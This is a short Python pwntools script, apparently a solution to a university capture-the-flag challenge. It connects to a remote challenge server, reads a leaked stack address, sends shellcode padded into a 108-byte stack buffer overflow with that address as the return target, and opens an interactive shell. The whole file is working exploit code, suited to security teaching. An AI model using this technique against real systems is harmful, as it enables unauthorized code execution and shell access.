from pwn import *
import re

from pwnlib.adb.adb import shell

#p = process("./program")

e = context.binary = ELF("./program")
p = remote("ctf-fsi.fe.up.pt",4001)

#gdb.attach(p.pid)

shellcode = asm(shellcraft.sh())

p.recvuntil("buffer is ")

stack_base = int(p.recv(10),16)

payload = asm(shellcraft.sh())

payload = payload.ljust(108,b'A')

payload += p32(stack_base)

p.sendlineafter("input:",payload)
p.interactive()
